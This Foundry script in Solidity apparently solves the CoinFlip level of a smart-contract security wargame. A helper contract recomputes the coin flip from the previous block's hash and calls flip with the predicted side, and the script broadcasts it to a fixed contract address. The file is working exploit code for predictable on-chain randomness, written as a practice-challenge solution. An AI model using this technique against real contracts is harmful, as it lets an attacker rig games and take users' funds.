// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { CoinFlip } from "../src/CoinFlip.sol";

contract Solver {

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

	constructor (CoinFlip _ins) {
		uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        _ins.flip(side);
	}
}

contract CoinFlipSolver is Script {
	
	CoinFlip public instance = CoinFlip(0x38c2fbc3D1d62AC1349A99AA1fD38861Eb02C8c2);

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run () external {

		vm.startBroadcast(prv);

        new Solver(instance);
		console.logAddress(address(uint160(instance.consecutiveWins())));

		vm.stopBroadcast();

	}

}
